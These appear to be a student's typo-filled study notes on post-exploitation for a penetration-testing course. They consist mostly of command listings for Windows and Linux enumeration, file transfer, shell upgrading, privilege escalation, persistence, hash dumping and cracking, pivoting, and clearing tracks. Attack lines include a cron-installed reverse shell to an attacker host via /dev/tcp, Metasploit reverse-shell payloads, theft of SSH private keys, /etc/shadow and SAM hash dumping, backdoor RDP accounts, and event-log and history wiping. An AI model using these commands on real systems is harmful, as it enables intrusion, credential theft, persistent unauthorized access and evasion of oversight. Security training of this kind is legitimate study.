## Introduction to Post-Exploitation 
+ what you do after you gain access
+ depends on the kind of access and how stealthy you want to be

## Post Exploitation Methodology 
+ locla enumration, transfering files, upgrading shell, privliege esclation. presistence, dumping hashses,pivoting, clearing tracks
+ local enumration - user nad groups,system inforamtion
+ transgering files - web server to download files
+ upgrading shell tty shell
+ priv escaltion, winpeas lin peas,
+ persistence
+ dumping crakc hashes
+ pivoting , internal network recon pivoting
+ clearing your trakcs on widnwos linxu

## Enumrating SYstem inforamtion 
+ Learn operating system verison
+ look host name os name os build os arhcitecure install update/hotfixes
```
meterpreter > getuid #username
meterpreter > sysinfo
hostname
systeminfo # all OS info
wmix qfe get Caption,Description,HotFixID, InstalledOn
cat eula.txt # information of OS info


```

## Enumarting User and Groups 
```
meterpreter > getprivs 
enum_logged_on_users 

whoami
whoami /priv
query user  # currently logged on user 
net users # list all the user accounts 
net user administrator 

net localgroup 
net localgroup administrators 
```

## enumerating network information 
```
ipconfig
ipconfig /all
route print

arp -a # routing table 

netstat -ano # services

netsh firewall show state

netsh advfirewall firewall show all profiles

```

## Enumerating Process and Services 
+ proceess is an instance of an exe
+ services that run on the background

```
meterpreter > ps
meterpreter > explorer.exe
meterpreter > migrate PID_NUM
net start #services

wmic service list brief # services running in the background

tasklist /SVC # services running with process

schtasks /query /fo LIST # list all scheduele task
schtask /query /fo / LIST -v 


```

## Automating Windows Local Enumeration 
+ we can use view script and tools
+ JAWS is Powershell script to help penetration tester quickly idenfitifed 
```
meterpreter > show_mount
background
search win_privs
search enum_logged_on_users
search chckvm
search enum_applications
search enum_computers
search enum_patches
search enum_shares

poweshell.exe -Execution Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

## Linux Local System Informnation 
+ Host name, distrubtion.kernel,cpu, disk information,installed packeges
```
ctrl z
session -u 1
meterpreter > sysinfo
hostname
cat /etc/issue
cat /etc/*release
uname -a
uname -r 
env # enviroemnt variabale
lscpu #cpu info
df -h #file system
df -ht ext4 #c-drive
lsblik | grep sd #storage dive
dpkg -l # shows all install backages 

```

## Enumerating Users and Groups 

```
meterpreter > getuid
whoami
groups root
cat /etc/passwd
ls /home
who
last 
lastlog
```

## Enumerating Network Information 
```
meterpreter > ifconfig
meterpreter > netstat
meterpreter > routes
cat /etc/networks 
cat /etc/hosts
cat /etc/resolv.conf
arp if arp not found use meterpreter


```

## Enumerating Cron Jobs 

```
meterpreter > ps
ps
ps aux | grep keyword
top
crontab -l
ls -al /etc/cron*

cat /etc/cron*

```

## automating Linux Privilege escaption 
+ time efficent
+ LinEnum
```
meterpreter > search enum_config
meterpreter > search enum_network
meterpreter > search enum_system
meterpreter > search checkvm
ctrl + shift + alt 
using meterpreter to insert linenum
upload name_of_file

```

## Setting Up a Web Server with Python 
+ some time you cant use meterpreter youi need to use in built file system
+ python comes wiht SimpleHTTPServer or http.server
```
python -m SimpleHTTPServer 80
python3 -m http.server 80

```

## Trasnfering File to WIndows Target 
```
certutil -urlcache -f http://IP/file_name file_name
```

## Transfering FIle to Linux 
```
wget http://IP/filename
```



## Upgrading Shells 
```
/bin/bash -i 

cat /etc/shells

/bin/sh -i

python --version

python -c 'import pty; pty.spawn("/bin/bash")'

env

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:sbin:/bin
export TERM=xterm
export SHELL=bash
```


## Widows Privilege Escalation 
+ In order to elevaste your privileges on Windowso you have to difentify the privilege escaltion The process will diffret greatly based on the types of target you gain access to
+ PrivescCheck for Windows 

```
msfconsole > web_delivery
set target PSH
set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EcondedCommand False
set LHOST KALIIP

shell_to_meterpreter
set LHOST eth1
show advanced
set WIN_TRANSFER VBS

Privescheck.ps1
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"

```

## Widnows Privlege Escelation 
+ psexec.py username@IP
+  msconsole psexec 

## Linux Privlege Escalation Weak Permissions 
+ Linenum
+ 
```
cat /etc/passwd
cat /etc/groups
groups
find / -not -type l -perm -o+w
ls -al /etc/shadow
openssl passwd -1 -salt abc password
remove * from etc shadow

```

## Linux Privlege Esclation Sudo 
+ Sudo Prileges access to target system
cat /etc/passwd
sudo -l
https://gtfobins.github.io/ 

## Windows Persistence 
+ Persistence Via Service
+ Consist of techniques that adversises use to keep access to system across restart, changed credntials and inttrupte cut off their resousne
+ maiuant persience
+ 
```
background
msf6> search persistence_service
set LPORT diffrent_port
payload windows/meterpreter/reverse_tcp

```
## Persistence via RDP 
 
```
meterpreter> run getgui -e -u danny -p hacker123321

xfreerdp /u:danny /p:hacker123321 /v:IP

```
## Linux Persistence SSH Keys 
+ Linux is deployed in server operating system
+ Linux is deployed on SSH
+ Client Network and website 
```
ls -al
cd .ssh/
scp student@IP:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa username@IP

```
## Persistence Via Cron Jobs 

```
cat /etc/cron
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/KALIIP/KALIPORT 0>&1'" > cron
crontab -i cron
crontab -l 
```

## Dumping and Cracking NTML HASHES
+ Windoes store account password in SAMS
```
> pgrep lsass
> migrate num
> hashdump
john --list=formats | grep NT
john --format=NT hashes.txt

john --format=NT hashes.tx --wordlist=/usr/share/wordlists/rockyou.txt

hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
## Dumping and Cracking Linux Password Hashes 
+ /etc/shadow ALL PASSWORD IFLES STORED
+ $1 md5
+ $2blowfish
+ $5 sha256
+ $6 sha512
+ 
+
```
john --format=sha512crypt file_location -wwordlist=/usr/share/wordlists/rockyou.txt

hashcat -a3 -m 1800 file_location wordlist_location
```
## Pivoting 
+ used a compromoise host ot gain access to system within other networks
+ after gaining access to exploit other host on a private internal network
+ meterpeter provides us with the ability to add a network route to the internal subnet

```
meterpreter > run autoroute -s IP/20
meterpreter >run autoroute -p
meterpreter >background
search portscan/tcp

meterpreter > portfwd add -l 1234 -p RPORT -r IP_SECONDMACHINE
nmap -sV -p 1234 localhost
background
set payload windows/meterpreter/bind_tcp

```

## Clearing Your Tracks Windows
+ Undo changes made to the target system
+ Store everything in TEMP
```
rm file
resource path_rc script
clearev 

```
## Clearing Tracks on  Linux 
+ 
```
history
history -c 

```
